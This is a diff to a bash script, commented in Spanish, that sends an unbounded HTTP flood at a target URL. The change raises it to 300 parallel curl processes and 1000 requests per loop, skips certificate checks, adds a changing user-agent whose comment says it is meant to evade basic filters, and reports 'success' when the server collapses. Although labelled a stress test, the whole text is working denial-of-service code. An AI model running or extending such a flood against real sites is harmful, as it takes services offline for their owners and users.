@@ -14,21 +14,23 @@ echo "Target: $TARGET_URL"
 echo "Fecha: $(date)"
 echo "-------------------------------------------------"
 
-# 1. Prueba de estrés real (Inundación Ultra-Agresiva)
-echo "[+] Iniciando inundación masiva (Extreme HTTP Flood)..."
-echo "[!] ADVERTENCIA: Esta prueba enviará miles de peticiones por segundo."
+# 1. Prueba de estrés real (Inundación Ultra-Agresiva v3)
+echo "[+] Iniciando inundación masiva (EXTREME HTTP Flood v3)..."
+echo "[!] ADVERTENCIA: Esta prueba enviará miles de peticiones por segundo sin límites."
 echo "[!] Presiona Ctrl+C en la terminal para detener el ataque."
 
-# Inundación infinita con hilos mucho más pesados y sin esperas
+# Inundación infinita con hilos extremos y parámetros de fuerza bruta
 while true; do
-    # -P 200: 200 hilos simultáneos
-    # --connect-timeout 2: No perder tiempo con conexiones lentas
-    seq 500 | xargs -n 1 -P 200 curl -s -L --connect-timeout 2 -o /dev/null -w "%{http_code}\n" "$TARGET_URL" >> /tmp/stress_results.txt
+    # -P 300: 300 hilos simultáneos
+    # --connect-timeout 1: Tiempo de espera mínimo
+    # --max-time 2: Máximo tiempo por petición para no bloquear hilos
+    # -A: User-agent aleatorio para intentar evadir filtros básicos
+    seq 1000 | xargs -n 1 -P 300 curl -s -L -k --connect-timeout 1 --max-time 2 -A "SANTRIX-Audit-Agent-$(date +%s)" -o /dev/null -w "%{http_code}\n" "$TARGET_URL" >> /tmp/stress_results.txt
     
-    # Análisis rápido de salud del servidor
-    FAIL_COUNT=$(tail -n 200 /tmp/stress_results.txt | grep -c -v "200")
-    if [ "$FAIL_COUNT" -gt 150 ]; then
-        echo "[!!!] ÉXITO: El servidor está colapsando o bloqueando el tráfico masivo."
+    # Análisis de salud
+    FAIL_COUNT=$(tail -n 300 /tmp/stress_results.txt | grep -c -v "200")
+    if [ "$FAIL_COUNT" -gt 250 ]; then
+        echo "[!!!] ÉXITO: El servidor está saturado o bloqueando activamente."
     fi
 done &
 STRESS_PID=$!
